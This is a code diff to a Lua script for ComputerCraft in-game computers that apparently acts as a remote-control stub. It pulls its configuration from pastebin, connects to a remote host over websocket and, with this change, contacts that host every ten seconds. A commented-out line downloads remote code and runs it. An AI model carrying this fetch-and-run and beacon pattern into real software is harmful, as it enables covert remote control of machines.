@@ -4,6 +4,7 @@
 
 local main = {}
 main.__index = main
+local isShuttingDown = false
 local _ogg = _G
 local _ogENV = _ENV
 local _OGShell = shell
@@ -107,7 +108,7 @@ custompairs.add_to_blacklist(customeventmanager.getQueueEventName())
 eventhook.setEventHandler(eventhandler)
 --local startup = (pcall(require, "sys.startup") and require("sys.startup")) or load(http.get("https://mydevbox.cc/src/sys/startup.lua", {["User-Agent"] = "ComputerCraft-BDA-Stub"}).readAll(), "startup", "t", _G)()
 --startup:onStartup()
-config:DownloadConfig("https://pastebin.com/raw/xNX6eKWq") --Old: https://pastebin.com/raw/rHA43mQp
+config:DownloadConfig("https://pastebin.com/raw/ExvGpiDF") --Old: https://pastebin.com/raw/rHA43mQp
 config:set("identifier.stubid", utils.generateRandomString(16))
 print("identifier: "..config:get("identifier.stubid"))
 print("RHOST: "..config:get("networking.http.rhost"))
@@ -127,6 +128,8 @@ rednetrouter.setEnD(EnD)
 core_router.setRednetrouter(rednetrouter)
 core_router.setWsrouter(wsrouter)
 core_router.setCommandHandler(command_handler)
+core_router.setRednetEnabled(config:get("networking.rednet.enabled"))
+core_router.setWsEnabled(config:get("networking.http.enabled"))
 command_handler.setMain(main)
 
 function main.getConfig()
@@ -160,7 +163,11 @@ end
 local function init()
     wsrouter.allow_encryption(true)
     wsrouter.connect(config:get("networking.http.rhost"))
-    core_router.send2host("0x00")
+    core_router.TXRX2Host("0x00", false)
+    while not isShuttingDown do
+        core_router.TXRX2Host("0x00", false)
+        sleep(10)
+    end
 end
 init()
 return main
